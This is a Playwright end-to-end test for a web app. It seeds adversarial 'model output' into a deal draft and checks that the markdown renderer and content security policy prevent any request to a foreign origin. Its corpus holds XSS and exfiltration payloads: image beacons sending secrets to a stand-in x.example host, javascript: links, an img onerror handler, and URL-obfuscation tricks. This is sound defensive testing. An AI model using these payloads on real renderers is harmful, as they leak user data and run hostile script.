import { expect, test } from '../support/fixtures';
import { zoomIntoCurrentStep } from '../support/rail';
import { createRailDeal } from '../support/railDealFixture';
import { RELATIONSHIP_PATHING_STEP_ID } from '@/lib/rail/dealRail';

/**
 * #226 A1 proven end to end: the real API seeds adversarial model output into
 * the Relationship Pathing draft, a production build with the enforced header
 * serves the real panel, and Chromium shows that nothing left for a foreign
 * origin. tests/markdown-exits.test.tsx is the unit contract for the renderer;
 * this is the same corpus on a real surface.
 *
 * A renderer leak would show twice: as a foreign request (recorded and aborted
 * by the context route below) and, under the enforced policy, as an `img-src`
 * violation that the fixture collector fails the test on. Under the enforced
 * header the browser blocks a stray `<img>` before it reaches the network, so
 * the violation and the DOM assertions are what catch an `<img>` leak; the
 * route recorder is what catches an exit the policy would allow.
 *
 * `CORPUS` is hand-copied from the unit test rather than imported across the
 * tests/ and e2e/ trees. Remote URLs sit on the reserved `.example` host.
 */

const TRACKING_LINK = 'https://tracker.example/landing?token=secret-123&utm=brief';

const CORPUS: string[] = [
  `Lead with the shared board seat. [Filing](${TRACKING_LINK})`,
  '![buyer list](https://x.example/p.png?q=secret)',
  '![ref][r]\n\n[r]: https://x.example/ref.png?q=secret',
  '[![pixel](https://x.example/t.gif)](https://x.example/landing)',
  '![d](data:image/png;base64,iVBORw0KGgo=)',
  'see www.x.example/a?b=c',
  'see https://x.example/a?b=c',
  'write to md@x.example',
  '<javascript:alert(1)>',
  '<img src="https://x.example/p.png" onerror="alert(1)">',
  '<svg><image href="https://x.example/p.png"/></svg>',
  '<link rel="stylesheet" href="https://x.example/s.css">',
  '[x](//x.example/a)',
  '[x](\\\\x.example\\a)',
  '[x](/\\x.example/a)',
  '[x](%6Aavascript:alert(1))',
  '[x](javascript:alert(1))',
  '![r](/api/v1/secret.png)',
];

function originOf(url: string | undefined): string | null {
  if (!url) return null;
  try {
    return new URL(url).origin;
  } catch {
    return null;
  }
}

test('adversarial model output in the pathing draft makes no request to a foreign origin', async ({
  page,
  context,
  baseURL,
  evidence,
  runId,
}) => {
  const deal = await createRailDeal(evidence.request, { runId, entryStepSeq: 8 });
  const seeded = await evidence.request.patch(
    `/api/v1/deals/${encodeURIComponent(deal.id)}/steps/${RELATIONSHIP_PATHING_STEP_ID}`,
    { data: { work: { pathing_brief: CORPUS.join('\n\n') } } },
  );
  expect(seeded.ok(), await seeded.text()).toBeTruthy();

  // Anything that is not the app or its Supabase is foreign. Recorded, then
  // aborted so a leak cannot reach the network even from a broken policy.
  const allowed = new Set([originOf(baseURL), originOf(process.env.NEXT_PUBLIC_SUPABASE_URL)]);
  const foreign: string[] = [];
  await context.route(/^https?:/, async (route) => {
    const url = route.request().url();
    if (allowed.has(originOf(url))) {
      await route.continue();
      return;
    }
    foreign.push(url);
    await route.abort();
  });

  try {
    const doc = await page.goto(`/projects/${encodeURIComponent(deal.code)}/rail`);
    expect(doc, 'the rail document response').not.toBeNull();
    await zoomIntoCurrentStep(page);
    expect
      .soft(doc!.headers()['content-security-policy'] ?? '', 'the enforced policy on the document')
      .toContain("img-src 'self' data:");

    const brief = page.getByRole('region', { name: 'Skill brief' });
    await expect(brief).toBeVisible();

    // Nothing in the draft is a network-loading element, an image became an
    // inert note, and no anchor leads anywhere but the page itself.
    const loaders = 'img, image, picture, source, video, audio, iframe, object, embed, link, script';
    expect.soft(await brief.locator(loaders).count(), 'network-loading elements').toBe(0);
    expect.soft(await brief.locator('[src], [srcset], [poster]').count(), 'src attributes').toBe(0);
    expect
      .soft(await brief.locator('[data-md-image-removed]').count(), 'image notes')
      .toBeGreaterThanOrEqual(1);
    const hrefs = await brief
      .locator('a[href]')
      .evaluateAll((anchors) => anchors.map((a) => a.getAttribute('href') ?? ''));
    expect
      .soft(
        hrefs.filter((href) => !href.startsWith('#')),
        'anchors that leave the page',
      )
      .toEqual([]);

    // The link is a feature: it opens the Leaving Conductia panel with the
    // full destination, and Cancel leaves without opening anything.
    await brief.locator('[data-md-external-link]', { hasText: 'Filing' }).click();
    const panel = page.getByRole('dialog', { name: /^This link opens / });
    await expect(panel).toBeVisible();
    await expect(panel.getByTestId('external-link-href')).toHaveText(TRACKING_LINK);
    await panel.getByRole('button', { name: 'Cancel' }).click();
    await expect(panel).toHaveCount(0);
  } finally {
    expect(foreign, 'requests to a foreign origin').toEqual([]);
  }
});
